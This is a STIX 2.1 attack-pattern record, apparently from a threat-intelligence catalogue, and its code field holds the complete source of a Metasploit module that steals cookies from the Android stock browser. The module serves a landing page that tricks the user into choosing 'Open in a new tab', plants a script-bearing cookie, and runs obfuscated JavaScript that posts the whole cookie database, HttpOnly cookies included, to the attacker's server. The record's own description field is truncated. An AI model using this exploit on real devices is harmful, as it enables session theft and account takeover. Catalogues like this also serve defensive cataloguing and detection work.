{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f8767212-43b8-4614-94a2-c98e03720265",
    "created": "2024-08-14T16:32:20.258726Z",
    "modified": "2024-08-14T16:32:20.258731Z",
    "name": "Android Browser \"Open in New Tab\" Cookie Theft",
    "description": " In Android's stock AOSP Browser application and WebView component, the",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/android_browser_new_tab_cookie_theft.rb",
            "external_id": "android_browser_new_tab_cookie_theft.rb"
        },
        {
            "source_name": "reference",
            "url": "https://android.googlesource.com/platform/packages/apps/Browser/+/d2391b492dec778452238bc6d9d549d56d41c107%5E%21/#F0"
        },
        {
            "source_name": "reference",
            "url": "http://www.rafayhackingarticles.net/2014/12/android-browser-cross-scheme-data.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::JSObfu\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'        => 'Android Browser \"Open in New Tab\" Cookie Theft',\n      'Description' => %q{\n        In Android's stock AOSP Browser application and WebView component, the\n        \"open in new tab\" functionality allows a file URL to be opened. On\n        versions of Android before 4.4, the path to the sqlite cookie\n        database could be specified. By saving a cookie containing a <script>\n        tag and then loading the sqlite database into the browser as an HTML file,\n        XSS can be achieved inside the cookie file, disclosing *all* cookies\n        (HttpOnly or not) to an attacker.\n      },\n      'Author'         => [\n        'Rafay Baloch', # Discovery of \"Open in new tab\" bug\n        'joev'          # Cookie theft vector, msf module\n      ],\n      'License'     => MSF_LICENSE,\n      'Actions'        => [[ 'WebServer', 'Description' => 'Serve exploit via web server' ]],\n      'PassiveActions' => [ 'WebServer' ],\n      'References' =>\n        [\n          # the patch, released against 4.3 AOSP in February 2014\n          ['URL', 'https://android.googlesource.com/platform/packages/apps/Browser/+/d2391b492dec778452238bc6d9d549d56d41c107%5E%21/#F0'],\n          ['URL', 'http://www.rafayhackingarticles.net/2014/12/android-browser-cross-scheme-data.html']\n        ],\n      'DefaultAction'  => 'WebServer'\n    ))\n\n     register_options([\n      OptString.new('COOKIE_FILE', [\n        true,\n        'The cookie file (on older 2.x devices this is \"webview.db\")',\n        'webviewCookiesChromium.db'\n      ])\n    ])\n  end\n\n  def on_request_uri(cli, request)\n    if request.method =~ /POST/i\n      print_status(\"Processing exfilrated files...\")\n      process_post(cli, request)\n      send_response_html(cli, '')\n    elsif request.uri =~ /\\.js$/i\n      print_status(\"Sending exploit javascript\")\n      send_response(cli, exfiltration_js, 'Content-type' => 'text/javascript')\n    else\n      print_status(\"Sending exploit landing page...\")\n      send_response_html(cli, landing_page_html)\n    end\n  end\n\n  def process_post(cli, request)\n    data = hex2bin(request.body)\n    print_good \"Cookies received: #{request.body.length.to_f/1024}kb\"\n    loot_path = store_loot(\n      \"android.browser.cookies\",\n      'application/x-sqlite3',\n      cli.peerhost,\n      data,\n      'cookies.sqlite',\n      \"#{cli.peerhost.ljust(16)} Android browser cookie database\"\n    )\n    print_good \"SQLite cookie database saved to:\\n#{loot_path}\"\n  end\n\n  def run\n    exploit\n  end\n\n  def landing_page_html\n    %Q|\n    <!doctype html>\n      <html>\n        <head><meta name=\"viewport\" content=\"width=device-width, user-scalable=no\" /></head>\n        <body style='width:100%;font-size: 16px;'>\n          <a href='file://#{cookie_path(datastore['COOKIE_FILE'])}##{Rex::Text.encode_base64(exfiltration_js)}'>\n            Redirecting... To continue, tap and hold here, then choose \"Open in a new tab\"\n          </a>\n          <script>\n            #{inline_script}\n          </script>\n        </body>\n      </html>\n    |\n  end\n\n  def exfiltration_js\n    js_obfuscate %Q|\n        var x = new XMLHttpRequest();\n        x.open('GET', '');\n        x.responseType = 'arraybuffer';\n        x.onreadystatechange = function(){\n          if (x.readyState == 4) {\n            var buff = new Uint8Array(x.response);\n            var hex = Array.prototype.map.call(buff, function(d){\n              var c = d.toString(16);\n              return (c.length < 2) ? '0'+c : c;\n            }).join('');\n            var x2 = new XMLHttpRequest();\n            x2.open('POST', '#{get_uri}/');\n            x2.setRequestHeader('Content-type', 'text/plain');\n            x2.send(hex);\n          }\n        };\n        x.send();\n\n      |\n  end\n\n  def inline_script\n    %Q|\n      document.cookie='#{per_run_token}=<script>eval(atob(location.hash.slice(1)))<\\\\/script>';\n    |\n  end\n\n  def cookie_path(file='')\n    '/data/data/com.android.browser/databases/' + file\n  end\n\n  # TODO: Make this a proper Rex::Text function\n  def hex2bin(hex)\n    hex.chars.each_slice(2).map(&:join).map { |c| c.to_i(16) }.map(&:chr).join\n  end\n\n  def per_run_token\n    @token ||= Rex::Text.rand_text_alpha(rand(2)+1)\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}